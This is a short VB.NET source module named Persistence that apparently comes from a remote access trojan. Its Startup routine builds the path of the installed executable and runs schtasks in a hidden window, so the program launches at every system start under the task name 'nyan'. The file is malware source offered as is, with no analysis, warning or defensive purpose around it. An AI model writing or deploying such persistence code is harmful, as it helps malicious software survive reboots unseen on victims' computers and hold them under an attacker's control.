Imports System.Security.AccessControl
Imports System.IO
Imports Microsoft.Win32
Imports System.Security.Principal
Imports System
Imports System.Windows.Forms
Imports Microsoft.VisualBasic
Imports j


Module Persistence

    Public Sub Startup()
        'schtasks - X-SHadow √
        Dim nyan = (Interaction.Environ(OK.DR) & "\" & OK.EXE)
        Shell("schtasks /create /sc onstart /mo 1 /tn nyan /tr " & nyan, AppWinStyle.Hide)
    End Sub

End Module